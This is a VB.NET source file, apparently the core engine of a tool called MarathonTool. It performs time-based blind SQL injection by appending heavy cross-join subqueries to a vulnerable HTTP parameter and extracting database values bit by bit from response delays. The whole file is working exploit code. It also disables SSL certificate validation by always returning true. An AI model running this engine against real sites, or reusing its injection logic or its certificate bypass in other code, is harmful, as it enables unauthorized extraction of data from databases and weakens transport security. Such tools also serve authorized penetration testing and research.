Imports System.IO
Imports System.Net
Imports System.Security.Cryptography.X509Certificates

''' <summary>
''' Provides basic functionality to make HTTP requests with time-based SQL injection using heavy queries
''' </summary>
Public Class BaseEngine
    Protected m_EngineSettings As EngineSettings
    Protected m_HttpSettings As HttpSettings

    Protected m_InitializedQueries As New Dictionary(Of String, InjectionParameters)

    Private m_Rnd As New Random

    Public Event DebugEvent(ByVal sender As Object, ByVal e As DebugEventArgs)

    ''' <summary>
    ''' Returns the HttpSettings of the instance
    ''' </summary>
    Public ReadOnly Property HttpSettings() As HttpSettings
        Get
            Return Me.m_HttpSettings
        End Get
    End Property

    ''' <summary>
    ''' Initializes an instance of the engine with the specified parameters
    ''' </summary>
    ''' <param name="httpSettings">The settings for the HTTP requests</param>
    ''' <param name="engineSettings">The settings for the injection engine</param>
    Public Sub New(ByVal httpSettings As HttpSettings, ByVal engineSettings As EngineSettings)
        'Callback function that is called automatically when making SSL requests
        ServicePointManager.ServerCertificateValidationCallback = AddressOf ValidateServerCertificateCallback

        Me.m_HttpSettings = httpSettings
        Me.m_EngineSettings = engineSettings
    End Sub

    ''' <summary>
    ''' Callback function that is called automatically when making SSL requests
    ''' </summary>
    ''' <returns>Always true to avoid certificate errors</returns>
    Private Shared Function ValidateServerCertificateCallback(ByVal sender As Object, ByVal cert As X509Certificate, _
        ByVal chain As X509Chain, ByVal sslPolicyErrors As Net.Security.SslPolicyErrors) As Boolean

        'Return (sslPolicyErrors = sslPolicyErrors.None)
        Return True
    End Function


    ''' <summary>
    ''' Gets an SQL statement with a subquery condition that uses a multiple cross join of a table
    ''' </summary>
    ''' <param name="numTables">The number of times to join the table with itself</param>
    ''' <param name="tableName">The name of the table to join</param>
    ''' <returns>A query that probably will delay the response of the server</returns>
    Private Function GetHeavyQuery(ByVal numTables As Integer, ByVal tableName As String) As String
        Dim sb As New System.Text.StringBuilder()

        Dim rand As Integer = m_Rnd.Next(1, 9999)

        sb.Append("100>(SELECT COUNT(*) FROM ")
        sb.Append(tableName)
        For i As Integer = 2 To numTables
            sb.Append(",").Append(tableName).Append(" T").Append(i)
        Next
        sb.Append(" WHERE ").Append(rand).Append("=").Append(rand)  'To avoid some cache problems
        Return sb.Append(")").ToString
    End Function


    ''' <summary>
    ''' Returns a string with the parameters to be passed to the HTTP request through GET or POST
    ''' </summary>
    ''' <param name="injection">The string to be injected into the vulnerable parameter</param>
    ''' <returns>The parameter string in URL-encoded form</returns>
    Private Function GetParameterString(ByVal injection As String) As String
        Dim params As String = ""

        For Each key As String In Me.m_HttpSettings.HttpParams.AllKeys
            params += key + "=" + System.Web.HttpUtility.UrlEncode(Me.m_HttpSettings.HttpParams(key))
            If key = Me.m_HttpSettings.InjectableHttpParamName Then params += injection
            params += "&"
        Next
        params = params.Substring(0, params.Length - 1)

        Return params
    End Function


    ''' <summary>
    ''' Sends the request and returns the response according to the values of HttpSettings
    ''' </summary>
    ''' <param name="injection">The string to be injected into the vulnerable parameter</param>
    ''' <returns>The response of the server, or the exception message</returns>
    Private Function Download(ByVal injection As String) As String
        Dim url As String = Me.m_HttpSettings.TargetBaseUrl

        If Not String.IsNullOrEmpty(Me.m_HttpSettings.AppendStartText) Then
            injection = Me.m_HttpSettings.AppendStartText + injection
        End If

        If Not String.IsNullOrEmpty(Me.m_HttpSettings.AppendEndText) Then
            injection += Me.m_HttpSettings.AppendEndText
        End If

        'Add GET parameters to the URL
        If Not Me.m_HttpSettings.UsePostMethod Then
            If url.Contains("?") Then
                url += "&"
            Else
                url += "?"
            End If
            url += Me.GetParameterString(injection)
        End If

        Me.RaiseDebugEvent("HTTP " + CStr(IIf(Me.m_HttpSettings.UsePostMethod, "POST", "GET")) + "  " + url, 100)

        Dim webReq As HttpWebRequest = CType(HttpWebRequest.Create(url), HttpWebRequest)

        'Send POST parameters
        If Me.m_HttpSettings.UsePostMethod Then
            webReq.Method = "POST"
            webReq.ContentType = "application/x-www-form-urlencoded"

            Dim postData As String = Me.GetParameterString(injection)

            Dim encoding As New System.Text.ASCIIEncoding()
            Dim bytes As Byte() = encoding.GetBytes(postData)
            webReq.ContentLength = bytes.Length
            Dim reqStream As Stream = webReq.GetRequestStream()
            reqStream.Write(bytes, 0, bytes.Length)
            reqStream.Close()
        End If

        'Cookies
        If Me.m_HttpSettings.Cookies IsNot Nothing AndAlso Me.m_HttpSettings.Cookies.Count > 0 Then
            webReq.CookieContainer = New CookieContainer()

            Dim cookieDomain As String = Me.m_HttpSettings.TargetBaseUrl.Split("/"c)(2).Split(":"c)(0)

            For Each key As String In Me.m_HttpSettings.Cookies.AllKeys
                webReq.CookieContainer.Add(New Cookie(key, Me.m_HttpSettings.Cookies(key), "/", cookieDomain))
            Next
        End If

        'Authentication
        If Me.m_HttpSettings.Authentication = MarathonTool.HttpSettings.AuthenticationType.Basic OrElse Me.m_HttpSettings.Authentication = MarathonTool.HttpSettings.AuthenticationType.Digest Then
            'Digest implemented like Basic authentication?
            webReq.Credentials = New NetworkCredential(Me.m_HttpSettings.UserName, Me.m_HttpSettings.Password)
        ElseIf Me.m_HttpSettings.Authentication = MarathonTool.HttpSettings.AuthenticationType.Ntlm Then
            webReq.Credentials = New NetworkCredential(Me.m_HttpSettings.UserName, Me.m_HttpSettings.Password, Me.m_HttpSettings.Domain)
        End If

        'Proxy
        If Not String.IsNullOrEmpty(Me.m_HttpSettings.ProxyAddress) AndAlso Me.m_HttpSettings.ProxyPort > 0 Then
            webReq.Proxy = New WebProxy(Me.m_HttpSettings.ProxyAddress, Me.m_HttpSettings.ProxyPort)
        End If


        'Connect and get response
        Dim webResp As WebResponse = Nothing
        Dim respStream As Stream = Nothing
        Dim strReader As StreamReader = Nothing
        Try
            webResp = webReq.GetResponse()
            respStream = webResp.GetResponseStream()
            strReader = New StreamReader(respStream)
            Return strReader.ReadToEnd()
        Catch ex As WebException
            Return ex.Message
        Finally
            If webResp IsNot Nothing Then webResp.Close()
            If respStream IsNot Nothing Then respStream.Close()
            If strReader IsNot Nothing Then strReader.Close()
        End Try
    End Function


    ''' <summary>
    ''' Suspends the currend thread for the specified time in PauseTimeAfterHeavyQuery
    ''' </summary>
    Private Sub PauseAfterHeavyQuery()
        If Me.m_EngineSettings.PauseTimeAfterHeavyQuery > 0 Then
            Threading.Thread.Sleep(Me.m_EngineSettings.PauseTimeAfterHeavyQuery)
        End If
    End Sub

    ''' <summary>
    ''' Suspends the currend thread for the specified time in PauseTimeAfterAnyQuery
    ''' </summary>
    Private Sub PauseAfterAnyQuery()
        If Me.m_EngineSettings.PauseTimeAfterAnyQuery > 0 Then
            Threading.Thread.Sleep(Me.m_EngineSettings.PauseTimeAfterAnyQuery)
        End If
    End Sub

    ''' <summary>
    ''' Calls to the Download function returning the ellapsed time and making a pause if necessary
    ''' </summary>
    ''' <param name="injection">The string to be injected into the vulnerable parameter</param>
    ''' <returns>Ellapsed time in milliseconds</returns>
    Private Function GetDownloadTime(ByVal injection As String) As Long
        Dim chrono As New System.Diagnostics.Stopwatch
        chrono.Start()
        Me.Download(injection)
        chrono.Stop()
        Dim time As Long = chrono.ElapsedMilliseconds

        If time >= (Me.m_EngineSettings.MinHeavyQueryTime * 0.8) Then
            Me.PauseAfterHeavyQuery()
        Else
            Me.PauseAfterAnyQuery()
        End If

        Return time
    End Function

    ''' <summary>
    ''' Calls to the Download function for RepeatTestCount times, returning the ellapsed time average
    ''' </summary>
    ''' <param name="injection">The string to be injected into the vulnerable parameter</param>
    ''' <returns>Ellapsed time average in milliseconds</returns>
    Private Function GetDownloadTimeAverage(ByVal injection As String) As Long
        Dim repeatCount As Integer = Me.m_EngineSettings.RepeatTestCount
        If repeatCount < 1 Then Throw New ArgumentException("Value must be greater than zero", "repeatCount")

        Dim totalTime As Long
        For i As Integer = 1 To repeatCount
            totalTime += Me.GetDownloadTime(injection)
        Next
        Return CLng(totalTime / repeatCount)
    End Function


    ''' <summary>
    ''' Gets the injection string for the specified parameters
    ''' </summary>
    ''' <param name="sqlCondition">The condition of the SQL "where" clause</param>
    ''' <param name="params">The parameters of the injection</param>
    ''' <returns>String with the heavy query injection, starting with " AND" </returns>
    Private Function GetHeavyQueryInjection(ByVal sqlCondition As String, ByVal params As InjectionParameters) As String
        If params.ReverseOrder Then
            Return " AND " + sqlCondition + " AND " + GetHeavyQuery(params.NumJoins, params.TableName)
        Else
            Return " AND " + GetHeavyQuery(params.NumJoins, params.TableName) + " AND " + sqlCondition
        End If
    End Function

    ''' <summary>
    ''' Checks if the specified condition is true or not, based on the response time
    ''' </summary>
    ''' <param name="sqlCondition">The condition of the SQL "where" clause</param>
    ''' <param name="params">The parameters of the injection</param>
    ''' <returns>True if the ellapsed time average is reasonably long</returns>
    Public Function IsTrue(ByVal sqlCondition As String, ByVal params As InjectionParameters) As Boolean
        Dim injection As String = Me.GetHeavyQueryInjection(sqlCondition, params)

        For i As Integer = 1 To 10
            Dim time As Long = Me.GetDownloadTimeAverage(injection)

            Dim result As Nullable(Of Boolean)
            If time > params.TimeTrue * 0.75 Then
                EngineStatistics.TrueQueries.Increment()
                result = True
            ElseIf time < params.TimeTrue * 0.35 Then
                EngineStatistics.FalseQueries.Increment()
                result = False
            Else
                EngineStatistics.IndeterminateQueries.Increment()
            End If

            Me.RaiseDebugEvent(String.Format("IsTrue  N={0} T={1}  {2} --> {3}", i, time, sqlCondition, result), 50)

            If result.HasValue Then Return result.Value

            'If i = 5 Then Me.Initialize()
            If i = 10 Then Throw New ApplicationException("The value cannot be determined after various attempts")
        Next
    End Function


    ''' <summary>
    ''' Initializes the parameters for the injection with the specified SQL type of "select" statement
    ''' </summary>
    ''' <param name="sqlSelect">A full SQL "select" statment that returns an integer value</param>
    ''' <returns>The initialized InjectionParameters object</returns>
    Private Function InitializeParams(ByVal sqlSelect As String) As InjectionParameters
        Me.Download("")

        Dim sqlTrueCondition As String = "(" + sqlSelect + ") < " + Integer.MaxValue.ToString
        Dim sqlFalseCondition As String = "(" + sqlSelect + ") > " + Integer.MaxValue.ToString

        For Each tableName As String In Me.m_EngineSettings.HeavyTableNames
            Dim exitCount As Integer = 0
            For numJoins As Integer = Me.m_EngineSettings.MinJoins To Me.m_EngineSettings.MaxJoins
                For reverse As Integer = 0 To 1
                    Dim params As New InjectionParameters(numJoins, tableName, CBool(reverse))
                    params.TimeTrue = Me.GetDownloadTimeAverage(Me.GetHeavyQueryInjection(sqlTrueCondition, params))

                    Me.RaiseDebugEvent(String.Format("Initializing  TBL={0}  N={1} R={2}  T={3:4}  Q={4}", tableName, numJoins, reverse, params.TimeTrue, sqlSelect), 60)

                    If params.TimeTrue >= Me.m_EngineSettings.MinHeavyQueryTime Then
                        Dim injection As String = Me.GetHeavyQueryInjection(sqlFalseCondition, params)
                        params.TimeFalse = Me.GetDownloadTimeAverage(injection)
                        If params.TimeFalse <= (Me.m_EngineSettings.MinHeavyQueryTime * 0.6) Then Return params
                        exitCount += 1
                        If exitCount = 4 Then Exit For
                    End If
                Next
                If exitCount = 4 Then Exit For
            Next
        Next
        Return InjectionParameters.Empty
    End Function


    ''' <summary>
    ''' Makes the necessary initializations and injections to guess the value of the specified SQL "select" statement
    ''' </summary>
    ''' <param name="sqlFormat">The generic format of the injection to get its injection parameters</param>
    ''' <param name="sqlSelect">The specific injection string to inject</param>
    ''' <param name="min">The minimum possible value</param>
    ''' <param name="max">The maximum possible value</param>
    ''' <param name="useBinarySearch">True to use the binary search technique. False to use a sequential method</param>
    ''' <returns>The value guessed for the specified injection</returns>
    Protected Function FindNumericValue(ByVal sqlFormat As String, ByVal sqlSelect As String, Optional ByVal min As Long = 0, Optional ByVal max As Long = Integer.MaxValue, Optional ByVal useBinarySearch As Boolean = True) As Long
        Me.RaiseDebugEvent(String.Format("FindNumericValue  {0}  ({1} to {2})", sqlSelect, min, max), 40)

        Dim params As InjectionParameters
        If Me.m_InitializedQueries.ContainsKey(sqlFormat) AndAlso Me.m_InitializedQueries(sqlFormat).IsInitialized Then
            params = Me.m_InitializedQueries(sqlFormat)
        Else
            params = InitializeParams(sqlSelect)
            Me.m_InitializedQueries.Remove(sqlFormat)
            Me.m_InitializedQueries.Add(sqlFormat, params)
        End If

        If Not params.IsInitialized Then Return -1 'Throw exception ?

        Dim t As New Diagnostics.Stopwatch
        t.Start()

        Dim iniMin As Long = min
        Dim iniMax As Long = max

        For i As Integer = 1 To 3
            min = iniMin
            max = iniMax
            Try
                If useBinarySearch OrElse Not Me.m_EngineSettings.EnableEqualInSelects Then
                    Do
                        Dim mid As Long = (min + max) \ 2
                        Dim sqlCondition As String = "(" + sqlSelect + ")>" + mid.ToString

                        If IsTrue(sqlCondition, params) Then
                            min = mid
                        Else
                            max = mid
                        End If

                        If (max - min) < 15 Then   'CInt(Me.m_TimeTrue / (Me.m_TimeFalse * 2)) 
                            If Me.m_EngineSettings.EnableEqualInSelects Then
                                min += 1
                            Else
                                max -= 1
                            End If

                            Exit Do 'Stop the binary search and continues sequentially
                        End If
                    Loop
                End If

                If Me.m_EngineSettings.EnableEqualInSelects Then
                    For value As Long = min To max
                        Dim sqlCondition As String = "(" + sqlSelect + ")=" + value.ToString
                        If IsTrue(sqlCondition, params) Then Return value
                    Next
                Else
                    For value As Long = max To min Step -1
                        Dim sqlCondition As String = "(" + sqlSelect + ")>" + value.ToString
                        If IsTrue(sqlCondition, params) Then Return value + 1
                    Next
                    Return min
                End If

                Throw New ApplicationException("The result of the condition cannot be determined")
            Catch ex As ApplicationException
                Me.m_InitializedQueries(sqlFormat) = InjectionParameters.Empty
            Finally
                t.Stop()
                Me.RaiseDebugEvent(String.Format("Value found  {0} --> {1}", sqlSelect, FindNumericValue), 20)
            End Try
        Next
    End Function

    ''' <summary>
    ''' Raises a DebugEvent with the specified parameters and writes the message to the debug standard output
    ''' </summary>
    ''' <param name="message">The message of the event</param>
    ''' <param name="verbosityLevel">The detail level of the message (higer value is less relevant)</param>
    Protected Sub RaiseDebugEvent(ByVal message As String, ByVal verbosityLevel As Integer)
        Debug.WriteLine(message)
        RaiseEvent DebugEvent(Me, New DebugEventArgs(message, verbosityLevel))
    End Sub




End Class
